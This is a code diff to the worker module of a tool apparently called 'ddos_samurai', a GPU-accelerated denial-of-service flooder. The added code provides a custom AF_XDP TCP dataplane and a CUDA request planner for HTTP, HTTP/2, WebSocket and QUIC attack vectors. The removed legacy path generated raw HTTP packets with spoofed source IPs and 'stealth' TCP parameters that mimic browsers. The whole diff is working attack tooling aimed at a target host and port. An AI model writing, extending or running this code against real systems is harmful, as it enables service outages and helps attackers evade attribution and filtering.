@@ -184,6 +184,23 @@ def _empty_stats() -> dict:
         "dp_queue_id": -1,
         "dp_queue_strategy": "unknown",
         "dp_affinity_cpu": -1,
+        "custom_tcp_bridge_backend_requested": "",
+        "custom_tcp_bridge_backend_used": "",
+        "custom_tcp_bridge_backend_match": 1,
+        "custom_tcp_bridge_degraded": 0,
+        "custom_tcp_bridge_fallback_reason": "none",
+        "custom_tcp_bridge_fallback_detail": "",
+        "custom_tcp_bridge_xdp_interface": "",
+        "custom_tcp_bridge_xdp_queue_id": -1,
+        "custom_tcp_bridge_xdp_available": 0,
+        "custom_tcp_bridge_xdp_enabled": 0,
+        "runtime_transport_service": "",
+        "runtime_transport_contract": "",
+        "runtime_transport_poll_calls": 0,
+        "runtime_transport_poll_actions": 0,
+        "runtime_transport_rx_poll_enabled": 0,
+        "runtime_transport_snapshot_available": 0,
+        "runtime_transport_service_loops": 0,
     }
 
 
@@ -685,6 +702,64 @@ def _add_stats(acc: dict, item: dict) -> dict:
             acc["dp_affinity_cpu"] = item_dp_affinity_cpu
         elif current_dp_affinity_cpu != item_dp_affinity_cpu:
             acc["dp_affinity_cpu"] = -2
+    item_custom_backend_requested = str(item.get("custom_tcp_bridge_backend_requested", "") or "").strip()
+    if item_custom_backend_requested:
+        current = str(acc.get("custom_tcp_bridge_backend_requested", "") or "").strip()
+        if not current:
+            acc["custom_tcp_bridge_backend_requested"] = item_custom_backend_requested
+        elif current != item_custom_backend_requested and current != "mixed":
+            acc["custom_tcp_bridge_backend_requested"] = "mixed"
+    item_custom_backend_used = str(item.get("custom_tcp_bridge_backend_used", "") or "").strip()
+    if item_custom_backend_used:
+        current = str(acc.get("custom_tcp_bridge_backend_used", "") or "").strip()
+        if not current:
+            acc["custom_tcp_bridge_backend_used"] = item_custom_backend_used
+        elif current != item_custom_backend_used and current != "mixed":
+            acc["custom_tcp_bridge_backend_used"] = "mixed"
+    acc["custom_tcp_bridge_backend_match"] = min(
+        int(acc.get("custom_tcp_bridge_backend_match", 1) or 0),
+        int(item.get("custom_tcp_bridge_backend_match", 1) or 0),
+    )
+    acc["custom_tcp_bridge_degraded"] = max(
+        int(acc.get("custom_tcp_bridge_degraded", 0) or 0),
+        int(item.get("custom_tcp_bridge_degraded", 0) or 0),
+    )
+    item_custom_fallback_reason = str(item.get("custom_tcp_bridge_fallback_reason", "") or "").strip()
+    if item_custom_fallback_reason:
+        current = str(acc.get("custom_tcp_bridge_fallback_reason", "") or "").strip()
+        if not current or current == "none":
+            acc["custom_tcp_bridge_fallback_reason"] = item_custom_fallback_reason
+        elif current != item_custom_fallback_reason and current != "mixed":
+            acc["custom_tcp_bridge_fallback_reason"] = "mixed"
+    item_custom_fallback_detail = str(item.get("custom_tcp_bridge_fallback_detail", "") or "").strip()
+    if item_custom_fallback_detail:
+        current = str(acc.get("custom_tcp_bridge_fallback_detail", "") or "").strip()
+        if not current:
+            acc["custom_tcp_bridge_fallback_detail"] = item_custom_fallback_detail
+        elif item_custom_fallback_detail not in current:
+            acc["custom_tcp_bridge_fallback_detail"] = f"{current};{item_custom_fallback_detail}"
+    item_custom_xdp_iface = str(item.get("custom_tcp_bridge_xdp_interface", "") or "").strip()
+    if item_custom_xdp_iface:
+        current = str(acc.get("custom_tcp_bridge_xdp_interface", "") or "").strip()
+        if not current:
+            acc["custom_tcp_bridge_xdp_interface"] = item_custom_xdp_iface
+        elif current != item_custom_xdp_iface and current != "mixed":
+            acc["custom_tcp_bridge_xdp_interface"] = "mixed"
+    item_custom_xdp_queue_id = int(item.get("custom_tcp_bridge_xdp_queue_id", -1) or -1)
+    if item_custom_xdp_queue_id >= 0:
+        current = int(acc.get("custom_tcp_bridge_xdp_queue_id", -1) or -1)
+        if current < 0:
+            acc["custom_tcp_bridge_xdp_queue_id"] = item_custom_xdp_queue_id
+        elif current != item_custom_xdp_queue_id:
+            acc["custom_tcp_bridge_xdp_queue_id"] = -2
+    acc["custom_tcp_bridge_xdp_available"] = max(
+        int(acc.get("custom_tcp_bridge_xdp_available", 0) or 0),
+        int(item.get("custom_tcp_bridge_xdp_available", 0) or 0),
+    )
+    acc["custom_tcp_bridge_xdp_enabled"] = max(
+        int(acc.get("custom_tcp_bridge_xdp_enabled", 0) or 0),
+        int(item.get("custom_tcp_bridge_xdp_enabled", 0) or 0),
+    )
     _state_active = int(item.get("state_active_entries", 0) or 0)
     if _state_active > 0 or int(acc.get("state_active_entries", 0) or 0) == 0:
         acc["state_active_entries"] = _state_active
@@ -938,6 +1013,13 @@ async def worker_process(
     dp_queue_id_cfg = int(args.get("dp_queue_id", args.get("xdp_queue_id", 0)) or 0)
     xdp_enable_cfg = bool(args.get("xdp_enable", False))
     xdp_interface_cfg = str(args.get("xdp_interface", "") or "").strip() or None
+    # Keep L7 transport selection in worker scope so both CPU and CUDA branches
+    # use the same resolved contract values.
+    _l7_custom_tcp_mode = str(args.get("custom_tcp_mode", "off") or "off").strip().lower()
+    _l7_transport_backend = "custom_tcp" if _l7_custom_tcp_mode in {"auto", "required"} else None
+    _l7_custom_tcp_rx_interface = str(
+        args.get("custom_tcp_rx_interface", "") or args.get("xdp_interface", "") or ""
+    ).strip()
     xdp_queue_id_cfg = int(dp_queue_id_cfg)
     xdp_mode_cfg = int(args.get("xdp_mode", 0) or 0)
     worker_stats["dp_queue_id"] = int(dp_queue_id_cfg)
@@ -1102,11 +1184,20 @@ async def worker_process(
             # LAZY IMPORT for GPU modules
             # NOTE: do not import `senders` here; it shadows the outer module name and
             # breaks CPU paths due to Python's local-variable scoping rules.
-            from . import gpu_packet, gpu_payload
+            from . import gpu_packet
+            try:
+                from . import gpu_cuda_payload
+            except Exception:
+                gpu_cuda_payload = None
             _gpu_packet_mod = gpu_packet
             from .utils import get_gateway_mac, mac_to_int
             # numba_cuda is imported above
             import cupy as cp
+
+            _gpu_vector_engine = "gpu_cuda"
+            if gpu_cuda_payload is None:
+                raise RuntimeError("gpu_cuda_payload modülü yüklenemedi; legacy planner yolu kaldırıldı.")
+            worker_stats["gpu_vector_engine"] = "gpu_cuda"
 
             try:
                 worker_stats["gpu_packet_backend_name"] = str(
@@ -1216,12 +1307,19 @@ async def worker_process(
                 return evt
 
             _state_engine_ready = False
+            _custom_tcp_ready = False
             _state_engine_mode = str(
                 args.get("engine_mode", os.environ.get("SAMURAI_STATE_ENGINE_MODE", "auto")) or "auto"
             ).strip().lower()
             if _state_engine_mode not in {"auto", "required"}:
                 _state_engine_mode = "auto"
             _state_engine_required = _state_engine_mode == "required"
+            _custom_tcp_mode = str(
+                args.get("custom_tcp_mode", os.environ.get("SAMURAI_CUSTOM_TCP_MODE", "off")) or "off"
+            ).strip().lower()
+            if _custom_tcp_mode not in {"off", "auto", "required"}:
+                _custom_tcp_mode = "off"
+            _custom_tcp_required = _custom_tcp_mode == "required"
             _state_sweep_interval_s = max(
                 0.05,
                 float(int(args.get("state_sweep_interval_ms", 1000) or 1000)) / 1000.0,
@@ -1252,57 +1350,160 @@ async def worker_process(
                 )
                 return
 
+            if getattr(senders, "CUSTOM_TCP_DATAPLANE_AVAILABLE", False) and getattr(senders, "custom_tcp_dataplane", None):
+                tcpdp = senders.custom_tcp_dataplane
+                if hasattr(tcpdp, "configure_tcp_dataplane") and _custom_tcp_mode != "off":
+                    try:
+                        tcpdp.configure_tcp_dataplane(
+                            _custom_tcp_mode,
+                            str(args.get("custom_tcp_backend", "af_xdp") or "af_xdp"),
+                            int(args.get("custom_tcp_initial_rto_ms", 250) or 250),
+                            int(args.get("custom_tcp_max_retransmits", 5) or 5),
+                            int(args.get("custom_tcp_connect_timeout_ms", 3000) or 3000),
+                            int(args.get("custom_tcp_idle_timeout_ms", 30000) or 30000),
+                        )
+                        _custom_tcp_ready = True
+                    except Exception as e:
+                        log_warning(f"[Worker {worker_id}] custom tcp dataplane configure failed: {e}")
+            elif _custom_tcp_required:
+                log_error(
+                    f"[Worker {worker_id}] custom tcp mode='required' but dataplane module is unavailable."
+                )
+                return
+
+            if _custom_tcp_required and not _custom_tcp_ready:
+                log_error(
+                    f"[Worker {worker_id}] custom tcp mode='required' and initialization failed; aborting worker."
+                )
+                return
+
+            class _RuntimeConnTemplate:
+                def __init__(self, target_ip: str, target_port: int):
+                    self.target_ip = str(target_ip)
+                    self.target_port = int(target_port)
+
+            class _RuntimeProfile:
+                def __init__(self, target_ip: str, target_port: int):
+                    self.connection_template = _RuntimeConnTemplate(target_ip, target_port)
+
+            _custom_tcp_service_profile = _RuntimeProfile(args.get("target", ""), int(args.get("port", 0) or 0))
+
             def _update_state_engine_stats():
                 nonlocal worker_stats
-                if not _state_engine_ready:
-                    return
-                if not getattr(senders, "FAST_SENDER_AVAILABLE", False) or not hasattr(senders, "fast_sender"):
-                    return
-                fs = senders.fast_sender
-                if not hasattr(fs, "get_state_engine_stats"):
-                    return
-                try:
-                    st = fs.get_state_engine_stats() or {}
-                    worker_stats["state_active_entries"] = int(st.get("active_entries", 0) or 0)
-                    worker_stats["state_timeout_evictions"] = int(st.get("timeout_evictions", 0) or 0)
-                    worker_stats["state_overwrites"] = int(st.get("overwrites", 0) or 0)
-                except Exception:
-                    pass
+                if _state_engine_ready:
+                    if getattr(senders, "FAST_SENDER_AVAILABLE", False) and hasattr(senders, "fast_sender"):
+                        fs = senders.fast_sender
+                        if hasattr(fs, "get_state_engine_stats"):
+                            try:
+                                st = fs.get_state_engine_stats() or {}
+                                worker_stats["state_active_entries"] = int(st.get("active_entries", 0) or 0)
+                                worker_stats["state_timeout_evictions"] = int(st.get("timeout_evictions", 0) or 0)
+                                worker_stats["state_overwrites"] = int(st.get("overwrites", 0) or 0)
+                            except Exception:
+                                pass
+                if _custom_tcp_ready and getattr(senders, "custom_tcp_dataplane", None) is not None:
+                    try:
+                        st = senders.custom_tcp_dataplane.snapshot_tcp_dataplane() or {}
+                        worker_stats["runtime_transport_service"] = "native_custom_tcp_runtime_service"
+                        worker_stats["runtime_transport_contract"] = "custom_tcp_runtime_bridge"
+                        worker_stats["runtime_transport_snapshot_available"] = 1
+                        for key, value in st.items():
+                            if str(key).startswith("tcp_"):
+                                worker_stats[str(key)] = int(value or 0)
+                    except Exception:
+                        pass
 
             def _ingest_state_from_batch(batch, sent_count: int):
                 if sent_count <= 0 or not _state_engine_ready:
-                    return
-                if not getattr(senders, "FAST_SENDER_AVAILABLE", False) or not hasattr(senders, "fast_sender"):
-                    return
-                fs = senders.fast_sender
-                if not hasattr(fs, "ingest_tx_packets"):
-                    return
-                try:
-                    fs.ingest_tx_packets(
-                        batch.get("cpu"),
-                        int(batch.get("packet_size", 0) or 0),
-                        int(sent_count),
-                    )
-                except Exception:
                     pass
+                else:
+                    if getattr(senders, "FAST_SENDER_AVAILABLE", False) and hasattr(senders, "fast_sender"):
+                        fs = senders.fast_sender
+                        if hasattr(fs, "ingest_tx_packets"):
+                            try:
+                                fs.ingest_tx_packets(
+                                    batch.get("cpu"),
+                                    int(batch.get("packet_size", 0) or 0),
+                                    int(sent_count),
+                                )
+                            except Exception:
+                                pass
+                if _custom_tcp_ready and getattr(senders, "custom_tcp_dataplane", None) is not None:
+                    tcpdp = senders.custom_tcp_dataplane
+                    if hasattr(tcpdp, "ingest_tcp_tx_packets"):
+                        try:
+                            tcpdp.ingest_tcp_tx_packets(
+                                batch.get("cpu"),
+                                int(batch.get("packet_size", 0) or 0),
+                                int(sent_count),
+                            )
+                        except Exception:
+                            pass
 
             def _maybe_sweep_state():
                 nonlocal _last_state_sweep
-                if not _state_engine_ready:
+                if not _state_engine_ready and not _custom_tcp_ready:
                     return
                 now = time.time()
                 if (now - _last_state_sweep) < _state_sweep_interval_s:
                     return
                 _last_state_sweep = now
-                if not getattr(senders, "FAST_SENDER_AVAILABLE", False) or not hasattr(senders, "fast_sender"):
+                if getattr(senders, "FAST_SENDER_AVAILABLE", False) and hasattr(senders, "fast_sender"):
+                    fs = senders.fast_sender
+                    if hasattr(fs, "sweep_state_table"):
+                        try:
+                            fs.sweep_state_table(4096)
+                        except Exception:
+                            pass
+                if _custom_tcp_ready and getattr(senders, "custom_tcp_dataplane", None) is not None:
+                    try:
+                        poll_stats = senders._custom_tcp_runtime_poll_snapshot(senders.custom_tcp_dataplane)
+                        if poll_stats:
+                            poll_stats.setdefault("runtime_transport_service", "native_custom_tcp_runtime_service")
+                            poll_stats.setdefault("runtime_transport_contract", "custom_tcp_runtime_bridge")
+                            worker_stats = _add_stats(worker_stats, poll_stats)
+                    except Exception:
+                        pass
+
+            async def _flush_custom_tcp_tx_packets():
+                nonlocal worker_stats
+                if not _custom_tcp_ready or getattr(senders, "custom_tcp_dataplane", None) is None:
                     return
-                fs = senders.fast_sender
-                if not hasattr(fs, "sweep_state_table"):
+                send_stats = await senders._flush_custom_tcp_tx_packets(
+                    profile=_custom_tcp_service_profile,
+                    verbose=bool(args.get("verbose", False)),
+                    pacing_config=pacing_cfg,
+                    bridge_api=senders.custom_tcp_dataplane,
+                    live_sent=sent_total,
+                    live_errors=errors_total,
+                    live_progress=progress,
+                    custom_tcp_backend=args.get("custom_tcp_backend", "af_xdp"),
+                    custom_tcp_xdp_interface=str(args.get("xdp_interface", "") or ""),
+                    custom_tcp_xdp_queue_id=int(args.get("xdp_queue_id", 0) or 0),
+                    custom_tcp_xdp_mode=int(args.get("xdp_mode", 0) or 0),
+                )
+                send_stats = dict(send_stats or {})
+                if not send_stats:
                     return
-                try:
-                    fs.sweep_state_table(4096)
-                except Exception:
-                    pass
+                worker_stats = _add_stats(worker_stats, send_stats)
+                worker_stats["runtime_transport_service"] = "native_custom_tcp_runtime_service"
+                worker_stats["runtime_transport_contract"] = "custom_tcp_runtime_bridge"
+                worker_stats["runtime_transport_service_loops"] = int(
+                    worker_stats.get("runtime_transport_service_loops", 0) or 0
+                ) + 1
+                for key in (
+                    "custom_tcp_bridge_backend_requested",
+                    "custom_tcp_bridge_backend_used",
+                    "custom_tcp_bridge_backend_match",
+                    "custom_tcp_bridge_fallback_reason",
+                    "custom_tcp_bridge_fallback_detail",
+                    "custom_tcp_bridge_xdp_interface",
+                    "custom_tcp_bridge_xdp_queue_id",
+                    "custom_tcp_bridge_xdp_available",
+                    "custom_tcp_bridge_xdp_enabled",
+                ):
+                    if key in send_stats:
+                        worker_stats[key] = send_stats[key]
 
             async def _enqueue_with_backpressure(ring_q: asyncio.Queue, batch_item: dict):
                 nonlocal _gpu_ring_depth_peak, _gpu_ring_block_wait_ns
@@ -1338,6 +1539,7 @@ async def worker_process(
                 if ingest_state:
                     _ingest_state_from_batch(send_batch, int(send_stats.get("sent", 0) or 0))
                 _maybe_sweep_state()
+                await _flush_custom_tcp_tx_packets()
 
             async def _drain_ring_to_depth(
                 ring_q: asyncio.Queue,
@@ -1367,12 +1569,35 @@ async def worker_process(
             def _iter_model_plans():
                 for session_plan in traffic_model_sessions:
                     try:
-                        rp = gpu_payload.build_request_plan_from_session_plan(session_plan)
+                        rp = gpu_cuda_payload.build_request_plan_from_session_plan(session_plan)
                     except Exception:
                         continue
                     if int(len(getattr(rp, "items", []) or [])) > 0:
                         yield rp
             traffic_model_request_plans = list(_iter_model_plans()) if traffic_model_enabled else []
+            _l7_custom_tcp_mode = str(args.get("custom_tcp_mode", "off") or "off").strip().lower()
+            _l7_transport_backend = "custom_tcp" if _l7_custom_tcp_mode in {"auto", "required"} else None
+            _l7_custom_tcp_rx_interface = str(
+                args.get("custom_tcp_rx_interface", "") or args.get("xdp_interface", "") or ""
+            ).strip()
+
+            def _compile_gpu_cuda_vector_plan(mode: str, batch_count: int):
+                safe_count = max(1, int(batch_count))
+                methods = [str(args.get("http_method", "GET") or "GET").strip().upper()]
+                paths = args.get("http_path") if isinstance(args.get("http_path"), list) else ["/"]
+                spec = {
+                    "mode": str(mode or "program"),
+                    "methods": methods if methods else ["GET"],
+                    "paths": paths if paths else ["/"],
+                    "header_profiles": ["default"],
+                    "body_profiles": ["none"],
+                    "max_steps": 4,
+                }
+                return gpu_cuda_payload.compile_vector_spec(
+                    spec=spec,
+                    seed=int(args.get("gpu_rng_seed", 1234) or 1234),
+                    batch_size=safe_count,
+                )
 
             if args['attack_vector'] == 'http' and bool(args.get('stateful', False)):
                 log_info("Initializing GPU L7 planner + CPU Stateful HTTP engine...")
@@ -1405,32 +1630,24 @@ async def worker_process(
                             request_plan=request_plan,
                             l7_profile_file=args.get("l7_profile_file", ""),
                             l7_template_mode=args.get("l7_template_mode", "compat"),
+                            transport_backend=_l7_transport_backend,
+                            stateful_runtime_backend=args.get("stateful_runtime_backend", "afxdp"),
+                            stateful_runtime_strict=bool(args.get("l7_capability_strict", False)),
+                            legacy_mode=bool(args.get("legacy_mode", False)),
+                            custom_tcp_backend=args.get("custom_tcp_backend", "af_xdp"),
+                            custom_tcp_rx_interface=_l7_custom_tcp_rx_interface,
+                            custom_tcp_xdp_interface=str(args.get("xdp_interface", "") or ""),
+                            custom_tcp_xdp_queue_id=int(args.get("xdp_queue_id", 0) or 0),
+                            custom_tcp_xdp_mode=int(args.get("xdp_mode", 0) or 0),
                             live_sent=sent_total,
                             live_errors=errors_total,
                             live_progress=progress,
                         ))
                     return
-                payload_engine = gpu_payload.GPUPayloadEngine(
-                    BATCH_SIZE,
-                    rng_seed=args.get("gpu_rng_seed", 1234),
-                )
-                custom_methods = [str(args.get("http_method", "GET") or "GET").upper()]
-                custom_paths = args.get("http_path")
-                custom_uas = [str(args.get("user_agent"))] if args.get("user_agent") else None
-                payload_engine.load_custom_wordlists(
-                    methods=custom_methods,
-                    paths=custom_paths if isinstance(custom_paths, list) and custom_paths else ["/"],
-                    uas=custom_uas,
-                )
-
                 while remaining > 0:
                     batch_count = min(remaining, BATCH_SIZE)
-                    payload_engine.count = batch_count
-                    request_plan = payload_engine.generate_h2_request_plan(
-                        target_ip=args['target'],
-                        count=batch_count,
-                        current_time=int(time.time() * 1000),
-                    )
+                    plan_batch = _compile_gpu_cuda_vector_plan("program", batch_count)
+                    request_plan = gpu_cuda_payload.plan_batch_to_h2_request_plan(plan_batch)
                     worker_stats = _add_stats(worker_stats, await senders.http_stateful_sender(
                         args['target'], args['port'],
                         batch_count, args['http_concurrency'],
@@ -1454,6 +1671,15 @@ async def worker_process(
                         request_plan=request_plan,
                         l7_profile_file=args.get("l7_profile_file", ""),
                         l7_template_mode=args.get("l7_template_mode", "compat"),
+                        transport_backend=_l7_transport_backend,
+                        stateful_runtime_backend=args.get("stateful_runtime_backend", "afxdp"),
+                        stateful_runtime_strict=bool(args.get("l7_capability_strict", False)),
+                        legacy_mode=bool(args.get("legacy_mode", False)),
+                        custom_tcp_backend=args.get("custom_tcp_backend", "af_xdp"),
+                        custom_tcp_rx_interface=_l7_custom_tcp_rx_interface,
+                        custom_tcp_xdp_interface=str(args.get("xdp_interface", "") or ""),
+                        custom_tcp_xdp_queue_id=int(args.get("xdp_queue_id", 0) or 0),
+                        custom_tcp_xdp_mode=int(args.get("xdp_mode", 0) or 0),
                         live_sent=sent_total,
                         live_errors=errors_total,
                         live_progress=progress,
@@ -1462,149 +1688,31 @@ async def worker_process(
                     await asyncio.sleep(0)
                 return
 
-            # --- NEW: GPU Payload Engine for HTTP ---
+            # Legacy gpu_payload fused HTTP yolu kaldırıldı.
             if args['attack_vector'] == 'http':
-                log_info("Initializing GPU Payload Engine (Polymorphic HTTP)...")
-
-                # Fragmentation on the GPU path is not supported in this build.
-                # Keep CPU/Scapy fragmentation (see ddos_samurai.senders.packet_sender).
-                if args.get('fragment', False):
-                    log_warning("GPU backend için --fragment şu an desteklenmiyor; görmezden geliniyor.")
-
-                # P2 FIX #19: Resolve Gateway MAC
-                gw_mac_str = get_gateway_mac(args['target'])
-                gw_mac_int = mac_to_int(gw_mac_str)
-
-                # --- NEW: TCP Mimicry Synchronization ---
-                profile_name = args.get("tls_profile", args.get("ja3_profile", "chrome_120"))
-                tcp_params = stealth.get_tcp_params(profile_name)
-
-                win_val = tcp_params['window']
-                mss_val = tcp_params['mss']
-                ttl_val = tcp_params['ttl']
-
-                stream_ring = _build_stream_ring()
-                stream_idx = 0
-                ready_queue = []
-
-                BATCH_SIZE = int(_gpu_batch_size)
-                remaining = args['count']
-                payload_engine = gpu_payload.GPUPayloadEngine(
-                    BATCH_SIZE,
-                    rng_seed=args.get("gpu_rng_seed", 1234),
-                )
-
-                # Load custom wordlists once per worker/engine.
-                if args.get('http_path') and isinstance(args['http_path'], list):
-                    payload_engine.load_custom_wordlists(paths=args['http_path'])
-
-                window_sizes_full = cp.empty(BATCH_SIZE, dtype=cp.uint16)
-                window_sizes_full.fill(win_val)
-                mss_values_full = cp.empty(BATCH_SIZE, dtype=cp.uint16)
-                mss_values_full.fill(mss_val)
-                ttls_full = cp.empty(BATCH_SIZE, dtype=cp.uint8)
-                ttls_full.fill(ttl_val)
-
-                while remaining > 0:
-                    batch_count = min(remaining, BATCH_SIZE)
-                    payload_engine.count = batch_count
-                    window_sizes = window_sizes_full[:batch_count]
-                    mss_values = mss_values_full[:batch_count]
-                    ttls = ttls_full[:batch_count]
-
-                    packets_gpu_array, packet_size = payload_engine.generate_fused_http(
-                        target_ip=args['target'],
-                        target_port=args['port'],
-                        real_src_ip=real_src_ip,
-                        spoof_ip=args['spoof'],
-                        stream=stream_ring[stream_idx],
-                        slot=stream_idx,
-                        gateway_mac=gw_mac_int,
-                        spoof_subnet=args.get('spoof_subnet', '1.0.0.0/8'),
-                        current_time=int(time.time() * 1000),
-                        window_sizes=window_sizes,
-                        mss_values=mss_values,
-                        ttls=ttls
-                    )
-                    packet_size_int = int(packet_size)
-                    lengths_gpu = payload_engine.packet_lengths[:batch_count]
-                    valid_mask = lengths_gpu > 0
-                    valid_count = int(cp.count_nonzero(valid_mask))
-                    if valid_count <= 0:
-                        remaining -= batch_count
-                        await asyncio.sleep(0)
-                        continue
-
-                    active_rows = packets_gpu_array[: batch_count * packet_size_int].reshape(batch_count, packet_size_int)
-                    if valid_count < batch_count:
-                        compact_rows = active_rows[valid_mask]
-                        if hasattr(cp, "ascontiguousarray"):
-                            active_gpu = cp.ascontiguousarray(compact_rows).reshape(-1)
-                        else:
-                            active_gpu = compact_rows.reshape(-1)
-                    else:
-                        active_gpu = active_rows.reshape(-1)
-
-                    current_batch = {
-                        "cpu": _gpu_to_host(
-                            active_gpu,
-                            f"http_fused_slot{stream_idx}",
-                            stream=stream_ring[stream_idx],
-                            blocking=False,
-                        ),
-                        "count": valid_count,
-                        "packet_size": packet_size_int,
-                        "stream": stream_ring[stream_idx],
-                        "slot": stream_idx,
-                        "ready_event": _make_ready_event(stream_ring[stream_idx]),
-                    }
-                    ready_queue.append(current_batch)
-                    stream_idx = (stream_idx + 1) % len(stream_ring)
-                    remaining -= batch_count
-
-                    while len(ready_queue) >= _gpu_pipeline_depth:
-                        send_batch = ready_queue.pop(0)
-                        _evt = send_batch.get("ready_event")
-                        if _evt is not None:
-                            await _await_cuda_event(_evt)
-                        send_buf = send_batch["cpu"]
-                        send_count = int(send_batch["count"])
-                        if send_count <= 0:
-                            continue
-                        worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
-                            packets_buffer=send_buf,
-                            target_ip=args['target'],
-                            target_port=args['port'],
-                            count=send_count,
-                            verbose=args['verbose'],
-                            pacing_config=pacing_cfg,
-                            live_sent=sent_total,
-                            live_errors=errors_total,
-                            live_progress=progress
-                        ))
-
-                    await asyncio.sleep(0)
-
-                while ready_queue:
-                    send_batch = ready_queue.pop(0)
-                    _evt = send_batch.get("ready_event")
-                    if _evt is not None:
-                        await _await_cuda_event(_evt)
-                    send_buf = send_batch["cpu"]
-                    send_count = int(send_batch["count"])
-                    if send_count <= 0:
-                        continue
-                    worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
-                        packets_buffer=send_buf,
-                        target_ip=args['target'],
-                        target_port=args['port'],
-                        count=send_count,
-                        verbose=args['verbose'],
-                        pacing_config=pacing_cfg,
-                        live_sent=sent_total,
-                        live_errors=errors_total,
-                        live_progress=progress
-                    ))
+                verify_ssl = (str(args.get('http_verify', 'true')).lower() != "false")
+                worker_stats = _add_stats(worker_stats, await senders.http_app_sender(
+                    args['target'], args['port'], args['count'], args['http_concurrency'],
+                    args['http_method'], args['http_path'], args['payloads'], args['verbose'],
+                    scheme=args['http_scheme'], verify=verify_ssl, timeout_s=args['http_timeout'], retries=args['http_retries'],
+                    ssl_context=ssl_context,
+                    cookies=args.get('cookies'),
+                    user_agent=args.get('user_agent'),
+                    l7_profile_file=args.get("l7_profile_file", ""),
+                    l7_template_mode=args.get("l7_template_mode", "compat"),
+                    transport_backend=_l7_transport_backend,
+                    stateful_runtime_backend=args.get("stateful_runtime_backend", "afxdp"),
+                    stateful_runtime_strict=bool(args.get("l7_capability_strict", False)),
+                    legacy_mode=bool(args.get("legacy_mode", False)),
+                    custom_tcp_backend=args.get("custom_tcp_backend", "af_xdp"),
+                    custom_tcp_rx_interface=_l7_custom_tcp_rx_interface,
+                    custom_tcp_xdp_interface=str(args.get("xdp_interface", "") or ""),
+                    custom_tcp_xdp_queue_id=int(args.get("xdp_queue_id", 0) or 0),
+                    custom_tcp_xdp_mode=int(args.get("xdp_mode", 0) or 0),
+                    live_sent=sent_total,
+                    live_errors=errors_total,
+                    live_progress=progress
+                ))
                 return
 
             if args['attack_vector'] == 'http2':
@@ -1636,35 +1744,18 @@ async def worker_process(
                             request_plan=request_plan,
                             l7_profile_file=args.get("l7_profile_file", ""),
                             l7_template_mode=args.get("l7_template_mode", "compat"),
+                            stateful_runtime_backend=args.get("stateful_runtime_backend", "afxdp"),
+                            stateful_runtime_strict=bool(args.get("l7_capability_strict", False)),
+                            legacy_mode=bool(args.get("legacy_mode", False)),
                             live_sent=sent_total,
                             live_errors=errors_total,
                             live_progress=progress,
                         ))
                     return
-                payload_engine = gpu_payload.GPUPayloadEngine(
-                    BATCH_SIZE,
-                    rng_seed=args.get("gpu_rng_seed", 1234),
-                )
-
-                custom_methods = [str(args.get("http_method", "GET") or "GET").upper()]
-                custom_paths = args.get("http_path")
-                custom_uas = None
-                if args.get("user_agent"):
-                    custom_uas = [str(args["user_agent"])]
-                payload_engine.load_custom_wordlists(
-                    methods=custom_methods,
-                    paths=custom_paths if isinstance(custom_paths, list) and custom_paths else ["/"],
-                    uas=custom_uas,
-                )
-
                 while remaining > 0:
                     batch_count = min(remaining, BATCH_SIZE)
-                    payload_engine.count = batch_count
-                    request_plan = payload_engine.generate_h2_request_plan(
-                        target_ip=args['target'],
-                        count=batch_count,
-                        current_time=int(time.time() * 1000),
-                    )
+                    plan_batch = _compile_gpu_cuda_vector_plan("program", batch_count)
+                    request_plan = gpu_cuda_payload.plan_batch_to_h2_request_plan(plan_batch)
                     plan_count = len(request_plan.items)
                     if plan_count > 0:
                         worker_stats = _add_stats(worker_stats, await senders.http2_sender(
@@ -1688,6 +1779,9 @@ async def worker_process(
                             request_plan=request_plan,
                             l7_profile_file=args.get("l7_profile_file", ""),
                             l7_template_mode=args.get("l7_template_mode", "compat"),
+                            stateful_runtime_backend=args.get("stateful_runtime_backend", "afxdp"),
+                            stateful_runtime_strict=bool(args.get("l7_capability_strict", False)),
+                            legacy_mode=bool(args.get("legacy_mode", False)),
                             live_sent=sent_total,
                             live_errors=errors_total,
                             live_progress=progress,
@@ -1727,24 +1821,10 @@ async def worker_process(
                                 live_progress=progress,
                             ))
                         return
-                    payload_engine = gpu_payload.GPUPayloadEngine(
-                        BATCH_SIZE,
-                        rng_seed=args.get("gpu_rng_seed", 1234),
-                    )
-                    ws_paths = [str(args.get("ws_path", "/") or "/")]
-                    payload_engine.load_custom_wordlists(
-                        methods=["GET"],
-                        paths=ws_paths,
-                        uas=[str(args.get("user_agent"))] if args.get("user_agent") else None,
-                    )
                     while remaining > 0:
                         batch_count = min(remaining, BATCH_SIZE)
-                        payload_engine.count = batch_count
-                        request_plan = payload_engine.generate_h2_request_plan(
-                            target_ip=args['target'],
-                            count=batch_count,
-                            current_time=int(time.time() * 1000),
-                        )
+                        plan_batch = _compile_gpu_cuda_vector_plan("program", batch_count)
+                        request_plan = gpu_cuda_payload.plan_batch_to_h2_request_plan(plan_batch)
                         worker_stats = _add_stats(worker_stats, await senders.websocket_scenario_sender(
                             target_ip=args['target'],
                             target_port=args['port'],
@@ -1823,23 +1903,10 @@ async def worker_process(
                             live_progress=progress,
                         ))
                     return
-                payload_engine = gpu_payload.GPUPayloadEngine(
-                    BATCH_SIZE,
-                    rng_seed=args.get("gpu_rng_seed", 1234),
-                )
-                payload_engine.load_custom_wordlists(
-                    methods=[str(args.get("quic_method", "GET") or "GET").upper()],
-                    paths=[str(args.get("quic_path", "/") or "/")],
-                    uas=[str(args.get("user_agent"))] if args.get("user_agent") else None,
-                )
                 while remaining > 0:
                     batch_count = min(remaining, BATCH_SIZE)
-                    payload_engine.count = batch_count
-                    request_plan = payload_engine.generate_h2_request_plan(
-                        target_ip=args['target'],
-                        count=batch_count,
-                        current_time=int(time.time() * 1000),
-                    )
+                    plan_batch = _compile_gpu_cuda_vector_plan("program", batch_count)
+                    request_plan = gpu_cuda_payload.plan_batch_to_h2_request_plan(plan_batch)
                     worker_stats = _add_stats(worker_stats, await senders.quic_sender(
                         target_ip=args['target'],
                         target_port=args['port'],
@@ -2614,6 +2681,15 @@ async def worker_process(
                     l7_capability_strict=bool(args.get("l7_capability_strict", False)),
                     l7_profile_file=args.get("l7_profile_file", ""),
                     l7_template_mode=args.get("l7_template_mode", "compat"),
+                    transport_backend=_l7_transport_backend,
+                    stateful_runtime_backend=args.get("stateful_runtime_backend", "afxdp"),
+                    stateful_runtime_strict=bool(args.get("l7_capability_strict", False)),
+                    legacy_mode=bool(args.get("legacy_mode", False)),
